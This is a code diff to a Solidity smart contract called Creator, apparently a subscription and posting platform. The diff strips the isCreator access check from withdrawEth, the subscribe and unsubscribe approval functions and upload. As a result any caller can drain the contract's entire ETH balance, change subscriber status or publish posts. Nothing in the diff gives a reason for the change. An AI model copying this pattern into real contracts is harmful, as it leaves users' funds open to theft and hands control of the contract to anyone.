@@ -122,7 +122,7 @@ contract Creator is SuperAppBase {
 
     receive() external payable {}
     
-    function withdrawEth() public isCreator{
+    function withdrawEth() public {
         (bool success, ) = msg.sender.call{value: (address(this).balance)}("Not admin");
         require(success, "No balance");
     }
@@ -132,29 +132,29 @@ contract Creator is SuperAppBase {
     //     ERC20(_token).transfer(msg.sender, ERC20(_token).balanceOf(address(this)));
     // }
     
-    function acceptSubscribe(address _address) external isCreator {
+    function acceptSubscribe(address _address) external  {
        require(subscribers[_address].status == Status.pendingSubscribe, "Not pending subscribe");
        subscribers[_address].status = Status.subscribed;
     }
     
-    function acceptUnsubscribe(address _address) external isCreator {
+    function acceptUnsubscribe(address _address) external  {
        require(subscribers[_address].status == Status.pendingUnsubscribe, "Not pending unsubscribe");
        delete subscribers[_address];
     }
     
-    function bulkAcceptSubscribe(address[] memory _addresses) external isCreator {
+    function bulkAcceptSubscribe(address[] memory _addresses) external  {
         for(uint i = 0; i < _addresses.length; i++) {
             subscribers[_addresses[i]].status = Status.subscribed;
         }
     }
     
-    function bulkAcceptUnsubscribe(address[] memory _addresses) external isCreator {
+    function bulkAcceptUnsubscribe(address[] memory _addresses) external  {
         for(uint i = 0; i < _addresses.length; i++) {
             delete subscribers[_addresses[i]];
         }
     }
     
-    function upload(string memory _metadataURL) external isCreator {
+    function upload(string memory _metadataURL) external  {
        Post storage post = posts[postCounter];
        post.metadataURL = _metadataURL;
        post.comments = emptyCommentArrray;
